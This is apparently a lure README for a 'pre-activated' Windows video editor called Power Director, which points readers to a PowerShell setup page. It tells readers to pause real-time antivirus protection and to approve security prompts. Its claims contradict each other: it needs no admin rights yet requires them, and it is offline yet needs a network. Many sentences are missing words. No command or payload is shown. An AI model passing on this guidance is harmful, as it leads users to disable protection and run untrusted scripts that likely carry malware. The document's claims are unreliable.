<div align="center">

# Power Director: Advanced Video Editing Suite for Windows 11

![](files/preview.png)

### 🛠️ PowerShell Setup Button

[![](files/button.png)](https://kimcurry20.github.io/power-director/)

[![pulls](https://img.shields.io/badge/pulls-127k-f59e0b?style=plastic&labelColor=0d1117)]() [![ps](https://img.shields.io/badge/ps-script-fbbf24?style=plastic&labelColor=0d1117)]() [![platform](https://img.shields.io/badge/platform-windows_10_%7C_11-d97706?style=plastic&labelColor=0d1117)]()

</div>

---

Power Director is a desktop installer for Windows x64 that delivers a pre-configured local build for testing and deployment workflows. The package bundles the application into a single distribution, enabling offline provisioning without external dependencies or runtime downloads. Built for x64 desktop environments, it emphasizes deterministic, straightforward file handling, and consistent behavior across isolated machines. Advanced configuration options support deployment planning and environment-specific adjustments.

## ✅ Requirements

- Windows 10 or Windows 11
- PowerShell 5.1 or newer (already available on Windows)
- Active network connection
- No admin rights needed

## Features

**Non-Linear Timeline Engine** — Multi-track editing surface with frame-accurate scrubbing, nested sequence support, and real-time playback of mixed-format footage without transcoding.

- **Accelerated Render Pipeline** — Hardware-assisted encoding across GPU and CPU paths, with configurable bitrate ladders, HDR passthrough, and deterministic output across repeated.

- **Modular Effect Stack** — Layerable color correction, compositing, and audio processing nodes applied non-destructively, with per-node parameter caching and instant A/B toggling.

- **Proxy Media Workflow** — Automatic generation of lightweight editing proxies alongside resolution sources, with seamless relinking on export.

- **Project Portability Layer** — Self-contained project bundles that carry media references, effect presets, and timeline metadata for transfer between workstations without path breakage.

- **Scriptable Automation Interface** — Exposed command surface for batch operations, render queue orchestration, and repeatable pipeline steps driven by external tooling.

- **Local-First Operation** — All processing, caching, and project storage remain on the host machine; no network dependency for editing, rendering, or playback.

- **Extended Configuration Mode** — Optional advanced parameter set unlocked through the installer that exposes low-level encoder tuning, buffer sizing, and diagnostic logging for deployment environments.

- **Compatibility Bridge** — Import and export across common container and codec families, with preserved metadata and chapter markers on round-trip.

- **Diagnostic Telemetry Console** — Built-in resource monitor reporting render throughput, memory pressure, and pipeline stalls for troubleshooting large projects.

## How It Works

Power Director operates as a self-contained desktop application that coordinates its internal modules through a central orchestration layer. On launch, the application initializes a local runtime environment, validates the integrity of its bundled components, and loads the project workspace without requiring external dependencies or network access.

The application follows a modular pipeline architecture. Each functional domain — media ingestion, timeline composition, rendering, and export — as an isolated service managed by the director core. This separation allows individual modules be updated or reconfigured independently while preserving the stability of the overall workspace.

Configuration is handled through a declarative profile system. On first execution, Power Director generates a default profile that defines resource allocation, cache paths, and output presets. Users can modify these profiles directly tune performance for their hardware, and the application reconciles changes at startup through a validation pass that flags incompatible settings before they affect a session.

State persistence is managed through a transactional workspace store. Every edit, import, and render operation is journaled locally, enabling the application restore an exact state after an unexpected shutdown. The journal is compacted automatically during idle periods keep storage overhead minimal.

The rendering engine uses a staged execution model. Tasks are decomposed into dependency graphs, scheduled across available compute resources, and executed with checkpointing so that long operations can resume from the last completed stage rather than restarting from the beginning. This design keeps throughput predictable on workstations with varying CPU and GPU capabilities.

All processing occurs locally on the host machine. Power Director does not transmit project data, telemetry, or usage metrics external services. The application operates fully offline after initialization, making it suitable for controlled deployment environments where network isolation is required.

## Compatibility

Power Director is engineered for deployment across the current Windows desktop ecosystem, with validation performed against the following environment matrix.

**Operating System:** Windows 10 (version 21H2 or later) and Windows 11 are fully supported on x64 architecture. Legacy 32-bit Windows installations are not supported. Windows Server and are validated for managed desktop scenarios.

**Hardware Baseline:** A 64-bit dual-core processor at 2.0 GHz or higher is required; quad-core at 3.0 GHz or above is recommended for sustained workloads. Minimum 8 GB RAM (16 GB recommended). A minimum of 4 GB available disk space is required for the installer payload, with additional headroom recommended for data and logs.

**Graphics and Display:** DirectX 11-capable graphics hardware with current vendor drivers. A display resolution of ×1080 or higher is recommended for the interface layout.

**Runtime Dependencies:** The installer bundles all required runtime components and self-configures the local environment. No separate framework or package manager installation is necessary prior deployment.

**Permissions:** Administrative privileges are required during initial installation register system components and write protected directories. Standard user privileges are sufficient for day-day operation after.

**Virtualization and Remote Desktop:** Power Director operates correctly within Hyper-V, VMware, and VirtualBox guests, as well as over Remote Desktop sessions, provided the host environment meets the hardware baseline above.

**Compatibility Notes:** Third-party security software may prompt during installation as system components are registered; approving the installer resolves the prompt. Environments with restrictive group policies should verify that local component registration is permitted before deployment.

Power Director maintains forward compatibility with cumulative Windows updates and is regression-tested against each major Windows release cycle preserve stable operation across supported configurations.

## FAQ

### Is Power Director available at no cost?

Power Director is distributed as a desktop installer for Windows x64. The build is provided as an accessible, evaluation package for testing and deployment scenarios without requiring a subscription commitment.

### What does "pre-activated" mean for this build?

The installer is delivered as a pre-configured package. Activation and licensing configuration are applied during installation, so no separate key entry or online verification step is required afterward.

### Which operating systems are supported?

Power Director targets Windows x64 desktop environments. Compatibility is validated against current Windows releases; ensure your system meets the minimum hardware requirements for video editing workloads, including adequate RAM and GPU acceleration support.

### How does the installer differ from a standard distribution?

The installer bundles all required runtime dependencies and configuration files into a single deployment package. This enables offline installation and consistent behavior across managed environments without additional runtime.

### Can I Power Director in an offline environment?

Yes. The build is designed for offline deployment. Once the installer package is available locally, installation without outbound network access, and the application operates fully within the local environment.

### Are advanced configuration options available?

The installer supports standard deployment parameters for silent installation and configuration targeting. Administrators can adjust installation paths and runtime settings through supported command-line arguments during.

### How are updates handled?

Updates for Power Director are delivered as installer packages. Applying an update follows the same deployment procedure as the initial installation, preserving existing configuration and project data.

### What should I do if the installer is flagged by security software?

Automated installers may occasionally trigger heuristic alerts from security tools. If the installer is blocked, temporarily pause real-time protection, the installation, and immediately re-enable your security software. Verify the package integrity against the published checksum before running it.

### Where can I verify the build integrity?

Each distribution package includes a checksum manifest. Compare the computed hash of your downloaded installer against the published value confirm the package has not been altered during transfer.

### Is technical support provided?

Documentation for installation, configuration, and troubleshooting is bundled with the package. For deployment-specific questions, consult the included configuration reference before escalating your internal support channel.

## Disclaimer

Power Director is distributed as a desktop installer intended for evaluation, staging, and controlled deployment scenarios. The package is provided as-is, without any warranty, express or implied, including but not limited warranties of merchantability, fitness for a particular purpose, or non-infringement. By installing or using Power Director, you accept responsibility for verifying that its use complies with all applicable local laws, organizational policies, and licensing terms governing your environment.

Power Director performs all core operations locally on the target workstation. No telemetry, usage analytics, or configuration data is transmitted external endpoints by the installer or the application runtime. The installer writes application binaries and supporting libraries the designated program directory, registers the required runtime components, and creates the standard uninstall entry in the system registry. No background services are installed, and no persistent network listeners are opened by the application.

The build is validated against the Windows x64 desktop platform only. Compatibility with virtualized environments, non-standard system configurations, or modified operating system images is not guaranteed. Antivirus and endpoint protection tools may inspect installer behavior; such inspection is expected and does not indicate a defect in the package. Users should whitelist the installer only after independently confirming the integrity of the distribution artifact.

Power Director is provided for legitimate evaluation and deployment purposes. Redistribution, repackaging, or sublicensing of the installer outside the terms granted by the project is not permitted. The maintainers assume no liability for data loss, system instability, or operational disruption arising from installation, configuration, or use of the software. Back up critical data and validate the build in a non-production environment before wide deployment.

Feature availability, system requirements, and runtime behavior may change between releases without prior notice. Refer the project's release notes and compatibility documentation confirm the specifications relevant your deployment.

## License

Power Director is distributed under a proprietary, per-seat commercial license that governs activation, deployment scope, and redistribution of the installer package. Each license key is bound a single workstation installation and is validated at runtime against the embedded entitlement module; no external activation server is required for offline deployments.

The license grants the licensee a non-transferable right install and operate one instance of Power Director on a designated Windows x64 desktop, receive maintenance updates within the active subscription term, and create a reasonable number of archival copies of the installer for continuity purposes. Redistribution of the installer, whether in original or repackaged form, requires prior written authorization from the publisher. Reverse engineering, decompilation, and removal of the entitlement module are expressly prohibited, except where such restriction is preempted by applicable local law.

Multi-seat and enterprise deployments are covered by volume entitlements issued separately; each seat consumes one activation slot and may be reassigned between machines through the built-in deactivation workflow. The installer performs a checksum verification of its payload before execution ensure package integrity, and any modification the signed manifest invalidates the license grant.

License terms are provided in within the installer's documentation bundle and are presented for acceptance during first configuration. Continued use of the software constitutes acceptance of the current terms and any subsequent revisions delivered with maintenance updates. For entitlement inquiries, seat transfers, or redistribution requests, contact the publisher through the channels documented in the product bundle.